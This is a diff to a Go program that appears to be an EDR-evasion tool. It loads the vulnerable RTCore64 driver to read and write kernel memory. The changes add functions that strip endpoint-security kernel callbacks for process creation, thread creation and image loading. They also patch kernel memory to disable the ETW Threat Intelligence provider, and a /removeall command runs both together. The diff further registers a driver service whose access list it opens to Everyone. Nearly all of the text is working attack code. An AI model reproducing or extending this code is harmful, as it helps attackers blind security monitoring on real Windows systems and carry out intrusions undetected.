@@ -153,6 +153,8 @@ type FOUND_EDR_CALLBACKS struct {
 	EDR_CALLBACKS [256]KRNL_CALLBACK
 }
 
+/*
+//PPL Killer
 func RegGetString(hKey int, subKey string, value string) string {
 	var RRF_RT_REG_SZ uint32 = 0x00000002
 	var bufLen uint32
@@ -169,7 +171,6 @@ func RegGetString(hKey int, subKey string, value string) string {
 }
 
 func getVersionOffsets() Offsets {
-	//PPL Killer
 	winver := RegGetString(windows.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
 	fmt.Printf("[+] Windows Version %s Found!\n", winver)
 	switch winver {
@@ -190,8 +191,30 @@ func getVersionOffsets() Offsets {
 		return Offsets{0, 0, 0, 0}
 	}
 	return Offsets{0, 0, 0, 0}
-
 }
+
+func findkrnlbase() DWORD64 {
+	cbNeeded := uint32(0)
+	var drivers [1024]DWORD64
+	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
+		return drivers[0]
+	}
+	//need error response
+	return drivers[0]
+}
+
+func getFunctionAddress(fnc string) DWORD64 {
+	ntoskrnlbaseaddress := findkrnlbase()
+	ntoskrnl, _ := LoadLibraryW("ntoskrnl.exe")
+	ntoskrnlProcaddress, _ := GetProcAddress(uintptr(ntoskrnl), fnc)
+	offset := DWORD64(ntoskrnlProcaddress) - DWORD64(ntoskrnl)
+	address := ntoskrnlbaseaddress + offset
+	FreeLibrary(ntoskrnl)
+	fmt.Println(address)
+	return address
+}
+
+*/
 
 func getDriverHandle() HANDLE {
 	name, err := syscall.UTF16PtrFromString("\\\\.\\RTCore64")
@@ -208,26 +231,6 @@ func getDriverHandle() HANDLE {
 	}
 }
 
-func findkrnlbase() DWORD64 {
-	cbNeeded := uint32(0)
-	var drivers [1024]DWORD64
-	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
-		return drivers[0]
-	}
-	//need error response
-	return drivers[0]
-}
-func getFunctionAddress(fnc string) DWORD64 {
-	ntoskrnlbaseaddress := findkrnlbase()
-	ntoskrnl, _ := LoadLibraryW("ntoskrnl.exe")
-	ntoskrnlProcaddress, _ := GetProcAddress(uintptr(ntoskrnl), fnc)
-	offset := DWORD64(ntoskrnlProcaddress) - DWORD64(ntoskrnl)
-	address := ntoskrnlbaseaddress + offset
-	FreeLibrary(ntoskrnl)
-	fmt.Println(address)
-	return address
-}
-
 func writeMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64, val DWORD) {
 	memRead := Rtcore64MemoryRead{}
 	memRead.Address = adr
@@ -236,6 +239,13 @@ func writeMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64, val DWORD) {
 	var bytesReturned uint32
 	memSize := uint32(unsafe.Sizeof(memRead))
 	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_WRITE_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
+}
+
+func writeMemoryBYTE(device HANDLE, adr DWORD64, val DWORD64) {
+	currentValue := readMemoryDWORD64(device, adr)
+	val = (currentValue & 0xFFFFFFFFFFFFFFF0) | val
+	writeMemoryPrimitive(device, 4, adr, DWORD(val&0xffffffff))
+	writeMemoryPrimitive(device, 4, adr+4, DWORD(val>>32))
 }
 
 func writeMemoryDWORD64(device HANDLE, adr DWORD64, val DWORD64) {
@@ -252,35 +262,20 @@ func readMemoryPrimitive(device HANDLE, s DWORD, adr DWORD64) DWORD {
 	DeviceIoControl(uintptr(device), RTCORE64_MEMORY_READ_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
 	return memRead.Value
 }
+
+func readMemoryBYTE(device HANDLE, adr DWORD64) DWORD64 {
+	return DWORD64(readMemoryPrimitive(device, 1, adr)) & 0xff
+}
+
 func readMemoryDWORD(device HANDLE, adr DWORD64) DWORD64 {
-	return DWORD64(readMemoryPrimitive(device, 4, adr))
+	return DWORD64(readMemoryPrimitive(device, 4, adr)) & 0xffffffff
 }
 
 func readMemoryDWORD64(device HANDLE, adr DWORD64) DWORD64 {
 	return (readMemoryDWORD(device, adr+4) << 32) | readMemoryDWORD(device, adr)
 }
 
-/* func patternSearch(device HANDLE, s DWORD64, e DWORD64, p DWORD64) DWORD64 {
-	r := int(e - s)
-	for i := 0; i < r; i++ {
-		ct := readMemoryDWORD64(device, s+DWORD64(i))
-		if ct == p {
-			return s + DWORD64(i)
-		}
-	}
-	return 0
-}
-*/
-func TrusteeValueFromSID(sid *windows.SID) windows.TrusteeValue {
-	return windows.TrusteeValue(unsafe.Pointer(sid))
-}
-
-func SIDFromTrusteeValueFromSID(t *windows.TrusteeValue) *windows.SID {
-	return (*windows.SID)(unsafe.Pointer(t))
-}
-
-func serviceAddEveryoneAccess(srvName string) bool {
-	status := false
+func serviceAddEveryoneAccess(srvName string) error {
 	trustee := windows.TRUSTEE{}
 	trustee.MultipleTrustee = nil
 	trustee.MultipleTrusteeOperation = windows.NO_MULTIPLE_TRUSTEE
@@ -296,29 +291,27 @@ func serviceAddEveryoneAccess(srvName string) bool {
 
 	oldSd, err := windows.GetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION)
 	if err != nil {
-		panic(err)
+		return err
 	}
 	stringSID, err := syscall.UTF16PtrFromString("S-1-1-0")
 	if err != nil {
-		panic(err)
+		return err
 	}
 	var sid *windows.SID
 	err = windows.ConvertStringSidToSid(stringSID, &sid)
 	if err != nil {
-		panic(err)
+		return err
 	}
-	da, _, _ := oldSd.DACL()
-	forEveryoneACL.Trustee.TrusteeValue = TrusteeValueFromSID(sid)
-	var nacl *windows.ACL
-	SetEntriesInAclW(1, &forEveryoneACL, da, &nacl)
-	err = windows.SetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION, nil, nil, nacl, nil)
+	oldDACL, _, _ := oldSd.DACL()
+	forEveryoneACL.Trustee.TrusteeValue = windows.TrusteeValueFromSID(sid)
+	var newDACL *windows.ACL
+	SetEntriesInAclW(1, &forEveryoneACL, oldDACL, &newDACL)
+	err = windows.SetNamedSecurityInfo(srvName, windows.SE_SERVICE, windows.DACL_SECURITY_INFORMATION, nil, nil, newDACL, nil)
 	if err != nil {
-		println(err)
-		panic(err)
+		return err
 	}
-	status = true
 	windows.FreeSid(sid)
-	return status
+	return nil
 }
 
 func serviceInstall(srvName string, dName string, bPath string, srvType uint32, startType uint32, startIt bool) uint32 {
@@ -355,13 +348,15 @@ func serviceInstall(srvName string, dName string, bPath string, srvType uint32, 
 				startType, windows.SERVICE_ERROR_NORMAL, binPath, nil, nil, nil, nil, nil)
 			if err == nil {
 				fmt.Printf("[+] '%s' service successfully registered\n", srvName)
-				if serviceAddEveryoneAccess(srvName) {
+				err = serviceAddEveryoneAccess(srvName)
+				if err == nil {
 					fmt.Printf("[+] '%s' service ACL to everyone\n", srvName)
 				} else {
 					fmt.Printf("[!] '%s' ServiceAddEveryoneAccess\n", srvName)
+					panic(err)
 				}
 			} else {
-				fmt.Println("CreateService")
+				fmt.Println("[X] CreateService")
 			}
 		} else {
 			fmt.Println("OpenService")
@@ -590,8 +585,6 @@ func getNtoskrnlVersion() NtoskrnlOffsets {
 				etwRegEntryGuidEntry,
 				etwGuidEntryProviderEnableInfo,
 			}
-			// fmt.Println(row)
-			// fmt.Println(ntoskrnlOffsets)
 			break
 		}
 	}
@@ -601,7 +594,8 @@ func getNtoskrnlVersion() NtoskrnlOffsets {
 func findNtoskrnlBaseAddress() DWORD64 {
 	cbNeeded := uint32(0)
 	var drivers [1024]DWORD64
-	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
+	sizeOfdrivers := uint32(unsafe.Sizeof(drivers))
+	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), sizeOfdrivers, &cbNeeded) {
 		return drivers[0]
 	}
 	//need error response
@@ -718,6 +712,15 @@ func enumPspXNotifyRoutine(nrt int, edrDrivers *FOUND_EDR_CALLBACKS, nOffsets *N
 	operateNotifyRoutines(pspXNotifyRoutineAddress, edrDrivers, false)
 }
 
+func removePspXNotifyRoutine(nrt int, edrDrivers *FOUND_EDR_CALLBACKS, nOffsets *NtoskrnlOffsets) {
+	notifyRoutineTypeStrs := [3]string{"process creation", "thread creation", "image loading"}
+	notifyRoutineTypeNames := [3]string{"ProcessCreate", "ThreadCreate", "LoadImage"}
+	pspXNotifyRoutineAddress := getPspXNotifyRoutineAddress(nrt, nOffsets)
+	fmt.Printf("[+] Removing %s callbacks\n", notifyRoutineTypeStrs[nrt])
+	fmt.Printf("[+] Psp%sNotifyRoutine: %x\n", notifyRoutineTypeNames[nrt], pspXNotifyRoutineAddress)
+	operateNotifyRoutines(pspXNotifyRoutineAddress, edrDrivers, true)
+}
+
 func enumAllEDRKernelCallbacks() {
 	ntoskrnlOffsets := getNtoskrnlVersion()
 	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
@@ -732,6 +735,91 @@ func enumAllEDRKernelCallbacks() {
 	enumPspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
 	enumPspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
 	println(edrDrivers.index)
+}
+
+func removeAllEDRKernelCallbacks() {
+	ntoskrnlOffsets := getNtoskrnlVersion()
+	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
+	if ntoskrnlVersion == "" {
+		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+		return
+	}
+	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+	var edrDrivers FOUND_EDR_CALLBACKS
+	edrDrivers.index = 0
+	removePspXNotifyRoutine(CREATE_PROCESS_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
+	removePspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
+	removePspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
+	println(edrDrivers.index)
+}
+
+func getEtwThreatIntProvRegHandleAddress(nOffsets *NtoskrnlOffsets) DWORD64 {
+	if nOffsets.etwThreatIntProvRegHandle == 0 {
+		return 0
+	}
+	ntoskrnlBaseAddress := findNtoskrnlBaseAddress()
+	return ntoskrnlBaseAddress + DWORD64(nOffsets.etwThreatIntProvRegHandle)
+
+}
+
+func getEtwThreatIntProviderEnableInfoAddress(nOffsets *NtoskrnlOffsets) DWORD64 {
+	if nOffsets.etwThreatIntProvRegHandle == 0 && nOffsets.etwRegEntryGuidEntry == 0 && nOffsets.etwGuidEntryProviderEnableInfo == 0 {
+		fmt.Println("[!] ETW Threat Intel ProviderEnableInfo address could not be found. This version of ntoskrnl may not implement ETW Threat Intel.")
+		return 0
+	}
+	device := getDriverHandle()
+	etwThreatIntProvRegHandleAddress := getEtwThreatIntProvRegHandleAddress(nOffsets)
+	etwThreatIntETWREGENTRYAddress := readMemoryDWORD64(device, etwThreatIntProvRegHandleAddress)
+	fmt.Printf("[+] Found ETW Threat Intel provider _ETW_REG_ENTRY at %x\n", etwThreatIntETWREGENTRYAddress)
+	etwThreatIntETWGUIDENTRYAddress := readMemoryDWORD64(device, etwThreatIntETWREGENTRYAddress+DWORD64(nOffsets.etwRegEntryGuidEntry))
+	CloseHandle(device)
+	return etwThreatIntETWGUIDENTRYAddress + DWORD64(nOffsets.etwGuidEntryProviderEnableInfo)
+
+}
+
+func changeStatusETWThreatIntelProvider(nOffsets *NtoskrnlOffsets, enable bool) {
+	var provState DWORD64 = 0
+	var txtState string = "disable"
+	if enable {
+		provState = 1
+		txtState = "enable"
+	}
+	etwThreatIntProviderEnableInfoAddress := getEtwThreatIntProviderEnableInfoAddress(nOffsets)
+	if etwThreatIntProviderEnableInfoAddress == 0 {
+		return
+	}
+	fmt.Printf("[*] Attempting to %sd the ETW Threat Intel provider by patching ProviderEnableInfo at %x with 0x%d.\n", txtState, etwThreatIntProviderEnableInfoAddress, provState)
+
+	device := getDriverHandle()
+	writeMemoryBYTE(device, etwThreatIntProviderEnableInfoAddress, provState)
+	finalState := isETWThreatIntelProviderEnabled()
+	if finalState == enable {
+		fmt.Printf("[+] The ETW Threat Intel provider was successfully %sd!\n", txtState)
+	} else {
+		fmt.Printf("[!] Failed to %s the ETW Threat Intel provider!\n", txtState)
+	}
+}
+
+func isETWThreatIntelProviderEnabled() bool {
+	state := false
+
+	ntoskrnlOffsets := getNtoskrnlVersion()
+	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
+	if ntoskrnlVersion == "" {
+		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+		return state
+	}
+	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+	etwThreatIntProviderEnableInfoAddress := getEtwThreatIntProviderEnableInfoAddress(&ntoskrnlOffsets)
+
+	if etwThreatIntProviderEnableInfoAddress == 0 {
+		return state
+	}
+	device := getDriverHandle()
+	etwThreatIntProviderEnableInfoValue := readMemoryBYTE(device, etwThreatIntProviderEnableInfoAddress)
+	CloseHandle(device)
+	state = etwThreatIntProviderEnableInfoValue == 0x1 //0x1 means ENABLE_PROVIDER
+	return state
 }
 
 /*
@@ -789,11 +877,17 @@ func main() {
 		fmt.Println(usage)
 	} else if os.Args[1] == "/enum" {
 		enumAllEDRKernelCallbacks()
+		if isETWThreatIntelProviderEnabled() {
+			fmt.Println("Enabled!!!!!!!!")
+		}
 		//findProcessCallbackRoutine("")
 	} else if os.Args[1] == "/deproc" && len(os.Args) == 3 {
 		//r := os.Args[2]
 		//findProcessCallbackRoutine(r)
-	} else if os.Args[1] == "/systemcmd" {
+	} else if os.Args[1] == "/removeall" {
+		removeAllEDRKernelCallbacks()
+		ntoskrnlOffsets := getNtoskrnlVersion()
+		changeStatusETWThreatIntelProvider(&ntoskrnlOffsets, false)
 		//makeSystem()
 	} else if os.Args[1] == "/install" {
 		installVulnDriver()
